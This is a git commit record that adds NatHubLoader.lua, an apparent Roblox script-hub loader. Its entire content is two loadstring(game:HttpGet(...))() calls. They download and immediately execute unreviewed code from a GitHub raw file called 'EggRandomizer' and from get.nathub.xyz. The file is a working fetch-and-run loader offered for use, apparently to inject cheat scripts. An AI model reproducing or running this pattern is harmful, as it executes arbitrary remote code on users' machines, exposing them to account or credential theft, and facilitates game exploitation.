4b6869cc397ee43c336043d87ef493c61cff4379
ZaqHub <clentsalva0@gmail.com>
2025-07-01 16:02:06 +0800

    NatHubLoader.lua

---
+++ NatHubLoader.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaqHub/EggRandomizer/refs/heads/main/EggRandomizerV1"))()
+wait(0)
+loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()
